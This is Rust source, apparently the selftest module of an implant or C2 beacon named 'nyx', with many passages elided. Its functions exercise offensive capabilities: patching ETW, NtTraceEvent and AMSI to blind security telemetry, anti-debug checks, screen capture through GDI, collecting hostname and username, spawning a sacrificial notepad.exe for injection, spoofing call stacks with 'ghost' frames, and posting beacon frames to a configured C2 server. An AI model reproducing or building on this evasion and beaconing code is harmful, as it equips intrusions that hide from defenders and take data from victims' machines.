...
#[cfg(feature = "selftest")]
fn ensure_rt() -> Option<&'static nyx_implant_core::syscalls::Runtime> {
    unsafe { nyx_implant_core::syscalls::init_global() };
    match nyx_implant_core::syscalls::global() {
        Some(rt) => Some(rt),
...
pub unsafe extern "system" fn nyx_selftest_fs() {
    ...
    let dir = join(
        &join(&tmp, "\\nyx_fs_dir_"),
        &dec_u32(nyx_implant_core::hostinfo::pid()),
    );
...
pub unsafe extern "system" fn nyx_selftest_screenshot_diag() {
    ...
    let load_lib = |dll: &[u8]| -> bool {
        let f: LoadLibraryA = unsafe {
            core::mem::transmute(
                nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA")
                    .unwrap_or(0),
            )
        };
        let mut name = [0u8; 32];
    ...
    let gsm: GetSystemMetrics = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetSystemMetrics").unwrap_or(0),
        )
    };
    let w = unsafe { gsm(0) };
    let h = unsafe { gsm(1) };
    ...
    let get_dc: GetDc = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetDC").unwrap_or(0),
        )
    };
    ...
    let ccdc: CreateCompatibleDc = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"gdi32.dll", b"CreateCompatibleDC")
                .unwrap_or(0),
        )
    };
    ...
    let ccb: CreateCompatibleBitmap = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"gdi32.dll", b"CreateCompatibleBitmap")
                .unwrap_or(0),
        )
    };
    ...
    let selobj: SelectObject = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"gdi32.dll", b"SelectObject").unwrap_or(0),
        )
    };
    let _prev = unsafe { selobj(mem_dc, bmp) };
    let bitblt: BitBlt = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"gdi32.dll", b"BitBlt").unwrap_or(0),
        )
    };
    ...
    let mut pixels = nyx_implant_core::heap::vec![0u8; need];
    ...
    let gdb: GetDiBits = unsafe {
        core::mem::transmute(
            nyx_implant_core::resolve::export_addr(b"gdi32.dll", b"GetDIBits").unwrap_or(0),
        )
    };
...
pub unsafe extern "system" fn nyx_selftest_antidebug() {
    ...
    if !nyx_implant_evasion::antidebug::is_debugged() {
        mask |= 1 << 0;
    }
    if nyx_implant_evasion::antidebug::uptime_secs() > 0 {
        mask |= 1 << 1;
    }
    // Exercise the syscall path too (it reaches ntdll via the runtime).
    let _ = nyx_implant_evasion::antidebug::is_remote_debugged();
    mask |= 1 << 2;
    unsafe { exit(mask) };
}
...
pub unsafe extern "system" fn nyx_selftest_blind_nttrace() {
    ...
    let resolved = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent").is_some();
    if resolved {
        mask |= 1 << 3;
    }
    match nyx_implant_evasion::blind::patch_nt_trace_event() {
        Ok(()) => {
            mask |= 1 << 0;
            ...
            if let Some(addr) =
                nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
            {
                if nyx_implant_evasion::blind::already_patched(
                    addr,
                    &nyx_implant_evasion::blind::NTTRACE_PATCH,
                ) {
                    mask |= 1 << 1;
                }
            }
            ...
            if nyx_implant_evasion::blind::patch_nt_trace_event().is_ok() {
                mask |= 1 << 2;
            }
        }
        Err(_) => {}
...
pub unsafe extern "system" fn nyx_selftest_hostinfo() {
    let mut mask: u32 = 0;
    let h = nyx_implant_core::hostinfo::hostname();
    if !h.is_empty() && h.as_bytes() != b"host" {
        mask |= 1 << 0;
    }
    let u = nyx_implant_core::hostinfo::username();
    if !u.is_empty() && u.as_bytes() != b"user" {
        mask |= 1 << 1;
    }
    if nyx_implant_core::hostinfo::pid() != 0 {
        mask |= 1 << 2;
    }
    // beacon_id should not be the old hardcoded 0x1337.
    if nyx_implant_core::hostinfo::beacon_id() != 0x1337 {
        mask |= 1 << 3;
    }
    unsafe { exit(mask) };
}
...
pub unsafe extern "system" fn nyx_selftest_bof_trace() {
    ...
    unsafe {
        let nums = &*core::ptr::addr_of!(crate::bof::TRACE_NUMS);
        ...
        s.push_str("bytes=");
        for b in (*core::ptr::addr_of!(crate::bof::TRACE_BYTES)).iter() {
...
pub unsafe extern "system" fn nyx_selftest_csprng() {
    ...
    let _ = crypto::register_csprng(nyx_implant_core::diag::csprng_fill);
    let mut buf = [0u8; 32];
    if !nyx_implant_core::diag::csprng_fill(&mut buf) {
        unsafe { exit(0xAF) };
    }
    ...
    nyx_implant_net::transport::ensure_winhttp();
    // 0xA5 reached: winhttp fns resolved OK

    // Step 6: Test post_frame (actual WinHTTP call — WinHttpOpen etc.)
    let _resp =
        nyx_implant_net::transport::post_frame(b"127.0.0.1", 8443u16, b"/beacon", &frame, false);
...
pub unsafe extern "system" fn nyx_selftest_loopdiag() {
    ...
    let _ = crypto::register_csprng(nyx_implant_core::diag::csprng_fill);
    let (cfg, config_plain) = nyx_implant_core::config::load();
    ...
    let resp = nyx_implant_net::transport::post_frame(
    ...
    nyx_implant_evasion::sleep::sleep_seconds(1);
    // 0xB1: sleep OK

    // Test the 3 things beacon_loop does at the top of each task-loop cycle.
    let _ = nyx_implant_evasion::blind::maybe_patch_amsi();
    // 0xB2: amsi OK
    ...
    let body = nyx_implant_net::transport::post_frame(
        cfg.server_host.as_bytes(),
        cfg.server_port,
        cfg.beacon_uri.as_bytes(),
        &frame2,
    ...
    let body3 = nyx_implant_net::transport::post_frame(
        cfg.server_host.as_bytes(),
        cfg.server_port,
        cfg.beacon_uri.as_bytes(),
        &frame3,
...
pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
    ...
    mk("step1_ntdll\n");
    let ntdll = match nyx_implant_core::resolve::LiveNtdll::locate() {
        Some(n) => n,
        None => {
            mk("FAIL_ntdll\n");
            unsafe {
    ...
    let _ = nyx_protocol::crypto::register_csprng(nyx_implant_core::diag::csprng_fill);
...
pub unsafe extern "system" fn nyx_linger() {
    ...
    nyx_implant_core::syscalls::init_global();
    let _ = nyx_implant_evasion::blind::patch_etw();
    let _ = nyx_implant_evasion::blind::patch_nt_trace_event();
    let _ = nyx_implant_evasion::blind::patch_amsi();
    // Stage the P2.1 gap pool so the staged chain is live in memory too.
    let scanner = nyx_implant_evasion::evasion_glue::LivePdataScanner;
    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        ...
        unsafe { nyx_implant_core::stack::set_gap_pool(leaked) };
        let _ = nyx_implant_core::stack::stage_for(leaked); // warm the staging path
    }
    ...
    for _ in 0..30 {
        ...
        let _ = unsafe { nyx_implant_core::syscalls::nt_delay_execution(rt, 0, interval_ptr) };
    }
    unsafe { exit(0) };
}
...
pub unsafe extern "system" fn nyx_selftest_blind_provider() {
    ...
    let mut report = nyx_implant_core::heap::String::new();
    let mut any_ok = false;
    let mut code27_ok = false;
    for &(code, label) in codes {
        let st = unsafe { nyx_implant_evasion::blind::disable_etw_provider_status(&guid, code) };
...
pub unsafe extern "system" fn nyx_selftest_inject_armed() {
    ...
    let exit_addr = match nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
        Some(a) => a,
        None => unsafe { exit(mask) },
    };
    ...
    match unsafe { crate::inject::create_sacrificial("notepad.exe") } {
        Ok(_proc) => {
            mask |= 1 << 0; // create_sacrificial Ok
                            ...
                            // guard on `_proc` terminates the never-resumed
...
pub unsafe extern "system" fn nyx_selftest_postex() {
    ...
    let mut mask: u32 = 0;
    let self_pid = nyx_implant_core::hostinfo::pid();
    if self_pid == 0 {
        unsafe { exit(0) };
    }
...
pub unsafe extern "system" fn nyx_selftest_config() {
    ...
    match nyx_implant_core::config::decode(&blob) {
        Ok(c) => {
            mask |= 1 << 0;
...
pub unsafe extern "system" fn nyx_selftest_fs_edge() {
    ...
    let lpath = join(&tmp, "\\nyx_large_test.bin");
    let mut lpayload = nyx_implant_core::heap::vec![0u8; 2 * 1024 * 1024];
...
#[cfg(feature = "selftest")]
unsafe fn nt_create_file_stack_path(rt: &nyx_implant_core::syscalls::Runtime) -> i32 {
    ...
    let st = unsafe {
        nyx_implant_core::syscalls::nt_create_file(
            rt,
    ...
    match st {
        Some(s) => {
            if s >= 0 {
                let _ = nyx_implant_core::syscalls::nt_close(rt, handle as usize);
            }
            s
        }
        None => -2,
...
unsafe fn nt_create_file_via_export_stack() -> i32 {
    let addr = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtCreateFile") {
        Some(a) => a,
        None => return -3,
    };
    ...
    for &(access, share, disp, opts, _ea, label) in combos {
        ...
        if st >= 0 {
            if let Some(cl) = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtClose") {
...
pub unsafe extern "system" fn nyx_selftest_fs_probe() {
    ...
    let code = match r {
        Ok(h) => {
            let _ = nyx_implant_core::syscalls::nt_close(rt, h as usize);
...
/// `pub` (was `pub(crate)` before the WP-C tasks split): the shell's entry.rs
/// calls this for its gate markers.
#[cfg(feature = "selftest")]
pub fn write_marker(name: &str, content: &str) {
    use core::ffi::c_void;
    ...
    let cf = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateFileW") };
    let wf = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"WriteFile") };
    let ch = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle") };
    ...
    let mut path16 = nyx_implant_core::heap::vec![0u16; fname.len() + 1];
...
pub unsafe extern "system" fn nyx_selftest_rt_probe() {
    ...
    let st = unsafe { nyx_implant_core::syscalls::nt_close(rt, 0) };
    let st_val = match st {
        Some(v) => v,
    ...
    let probe = nyx_implant_core::heap::vec![0u8; 64];
    if probe.len() != 64 {
    ...
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
    let cf: CreateFileW =
        match nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateFileW") {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => unsafe { exit(0xA3) },
        };
    let wf: WriteFile = match nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"WriteFile")
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xA4) },
    };
    let ch: CloseHandle =
        match nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => unsafe { exit(0xA5) },
        };
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let path = join(&tmp, "\\nyx_rt_probe.txt");
    let mut path16 = nyx_implant_core::heap::vec![0u16; path.len() + 1];
...
pub unsafe extern "system" fn nyx_selftest_alloc_probe() {
    ...
    let mut v = nyx_implant_core::heap::vec![0u8; 64];
    if v.len() == 64 {
        mask |= 1 << 0;
    }
    ...
    match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        Ok(pool) => {
            ...
            let ntdll_gaps = unsafe {
                match nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") {
                    Some(base) => match nyx_implant_core::resolve::pdata_view(base) {
                        Some(view) => {
                            let entries =
...
pub unsafe extern "system" fn nyx_selftest_mem() {
    let mut mask: u32 = 0;
    nyx_implant_evasion::mem::mask();
    nyx_implant_evasion::mem::unmask();
    ...
    nyx_implant_evasion::mem::round_trip_selftest(&mut buf);
    if buf == original {
        mask |= 1 << 1;
    }
    unsafe { exit(mask) };
...
pub unsafe extern "system" fn nyx_selftest_transport() {
    ...
    // + error handling.
    let r =
        unsafe { nyx_implant_net::transport::post_frame(b"127.0.0.1", 1, b"/beacon", b"x", false) };
    if r.is_none() {
        mask |= 1 << 0;
    }
    unsafe { exit(mask) };
...
fn env_var_or(name: &[u8], fallback: &str) -> String {
    ...
    let mut name16 = nyx_implant_core::heap::vec![0u16; name.len() + 1];
    for (i, &c) in name.iter().enumerate() {
        name16[i] = c as u16;
    }
    let mut buf = nyx_implant_core::heap::vec![0u16; 260];
...
pub unsafe extern "system" fn nyx_selftest_swap_armed() {
    ...
    nyx_implant_core::stack::set_swap_enabled(true);
    let r: u32 = unsafe {
        nyx_implant_core::stack::with_spoofed_stack(&pool, || 0x5A5A_5A5A) // dummy fn returning a marker
    };
    nyx_implant_core::stack::set_swap_enabled(false);
    mask |= 1 << 0; // reached exit → no crash (mov rsp round-tripped)
    if nyx_implant_core::stack::swap_was_attempted() {
...
unsafe fn diag_byte(ch: u8) {
    if !nyx_implant_evasion::blind_hwbp::DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
        return;
    }
    // Build wide string "C:\nyx\hwbp_diag.txt"
    ...
    let Some(cf) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateFileW") else {
        return;
    };
    let Some(wf) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"WriteFile") else {
        return;
    };
    let Some(ch_) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CloseHandle") else {
        return;
    };
    ...
    if let Some(sfp) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"SetFilePointer") {
...
pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
    nyx_implant_evasion::blind_hwbp::set_diag_enabled(true); // enable diag markers for selftest
    nyx_implant_evasion::blind_hwbp::init_countermeasures(); // scan gadgets + caller-spoof stubs
    ...
    if !nyx_implant_evasion::blind_hwbp::init_shadow_buffer() {
        diag_byte(b'!');
    ...
    match nyx_implant_evasion::blind_hwbp::blind_etw_hwbp() {
        Ok(slot) => {
            diag_byte(b'S');
            if nyx_implant_evasion::blind_hwbp::remove_hwbp(slot).is_ok() {
                diag_byte(b'T');
            }
            if nyx_implant_evasion::blind_hwbp::active_count() == 0 {
                diag_byte(b'U');
            }
            diag_byte(b'Z');
            nyx_implant_evasion::blind_hwbp::set_diag_enabled(false);
...
pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
    ...
    if let Some(gle) = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetLastError") {
    ...
    if !h.is_null() {
        if let Some(rveh) = nyx_implant_core::resolve::export_addr(
            b"kernel32.dll",
...
// ============================================================================
// nyx_selftest_task_guard: WP-B1 VEH task-guard mechanism + crash recovery.
//   bit0 = register+snapshot+remove round-trip: task_guard::run over an Ok
//          closure passes the closure's Vec<Response> through unchanged
//   bit1 = crash recovery: a deliberate null-page write inside run() is
//          caught by the guard, the thread resumes at the recovery point,
//          and run() yields the "task crashed: 0x........" Err sentinel
//   bit2 = re-arm after crash: the state machine is EMPTY again and the
//          guard arms and runs clean (bit0 path repeated)
//   bit3 = SKIP FLAG (not a pass): set when bit1/bit2 were NOT executed
//          because the guard's APIs don't resolve in this environment (e.g.
//          the Qiling stub rootfs exports neither AddVectoredExceptionHandler
//          nor RtlCaptureContext — Qiling 1.4.6 does not deliver emulated CPU
//          faults to guest-registered VEH handlers, so a guest AV would
//          surface as UcError in the runner, not as a guest exception). A
//          healthy Windows host always yields 0b0111 = 7; 0b1001 = 9 means
//          bit1 was skipped — visibly different, never a silent pass.
// Expect 7 on a real Windows host.
// ============================================================================
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_task_guard() {
    let mut mask: u32 = 0;

    // bit0: mechanism round-trip. The closure's response must come back
    // unchanged whether the guard armed or degraded to unguarded execution.
    let out = crate::task_guard::run(|| nyx_implant_core::heap::vec![Response::Ok]);
    if out.len() == 1 && matches!(out[0], Response::Ok) {
        mask |= 1 << 0;
    }

    if crate::task_guard::prereqs_available() {
        // bit1: crash recovery. write_volatile keeps LLVM from folding the
        // null store into a trap: the store executes for real and raises
        // STATUS_ACCESS_VIOLATION (address 0 is always unmapped — the
        // null-pointer assignment partition). If VEH delivery never happens
        // in this environment, this process dies with 0xC0000005 — a loud
        // failure, never a silent skip.
        let crashed = crate::task_guard::run(|| {
            // SAFETY: deliberate null-page write proving the guard catches a
            // fatal AV and resumes at the recovery point. Volatile so the
            // store is a real memory access, not an optimized-away UB trap.
            unsafe {
                core::ptr::write_volatile(core::ptr::null_mut::<u64>(), 0x4141_4242_4343_4444)
            };
            nyx_implant_core::heap::vec![Response::Ok] // unreachable when the guard works
        });
        if crashed.len() == 1 {
            if let Response::Err(m) = &crashed[0] {
                if m.starts_with("task crashed: 0xc0000005") {
                    mask |= 1 << 1;
                }
            }
        }

        // bit2: after a crash the state machine returned to EMPTY and the
        // guard arms again cleanly (repeat of the bit0 path).
        let again = crate::task_guard::run(|| nyx_implant_core::heap::vec![Response::Ok]);
        if again.len() == 1 && matches!(again[0], Response::Ok) {
            mask |= 1 << 2;
        }
    } else {
        // bit1/bit2 skipped: VEH/capture APIs unresolvable in this
        // environment (documented above). bit3 makes the skip visible in the
        // exit code — the matrix never mistakes a skipped crash test for a
        // passed one.
        mask |= 1 << 3;
    }
...
pub unsafe extern "system" fn nyx_selftest_lacuna() {
    ...
    let ntdll_base = match nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") {
        Some(b) => b,
        None => {
            unsafe { exit(mask) };
        }
    };
    let ntdll_ghosts = unsafe { nyx_implant_evasion::lacuna::scan_ghosts(ntdll_base) };
    if !ntdll_ghosts.is_empty() {
        mask |= 1 << 0;
    }

    let kb_ghosts =
        if let Some(kb) = nyx_implant_core::resolve::module_base_by_name(b"kernelbase.dll") {
            unsafe { nyx_implant_evasion::lacuna::scan_ghosts(kb) }
        } else {
            nyx_implant_core::heap::Vec::<nyx_implant_evasion::lacuna::GhostRegion>::new()
        };
    ...
    let w32_ghosts =
        if let Some(w32) = nyx_implant_core::resolve::module_base_by_name(b"win32u.dll") {
            unsafe { nyx_implant_evasion::lacuna::scan_ghosts(w32) }
        } else {
            nyx_implant_core::heap::Vec::<nyx_implant_evasion::lacuna::GhostRegion>::new()
        };
    ...
    let chain =
        nyx_implant_evasion::lacuna::build_ghost_chain(&ntdll_ghosts, &kb_ghosts, &w32_ghosts, 6);
    if chain.frames.len() >= 4 {
        mask |= 1 << 3;
    }

    // Install ghost chain for stack injection.
    nyx_implant_evasion::lacuna_stomp::install_ghost_chain(&chain);
    // Verify: with_ghost_stack executes without crashing.
    let mut stomp_ok = false;
    unsafe { nyx_implant_evasion::lacuna_stomp::with_ghost_stack(|| stomp_ok = true) };
    if stomp_ok {
        mask |= 1 << 4;
    }
...
pub unsafe extern "system" fn nyx_selftest_insomniac() {
    ...
    if let Some(region) = nyx_implant_evasion::sleep::own_text_region() {
        let _base = region.base as *const u8;
...
pub unsafe extern "system" fn nyx_selftest_cet_status() {
    let status = nyx_implant_evasion::caller_spoof::selftest_cet_status();
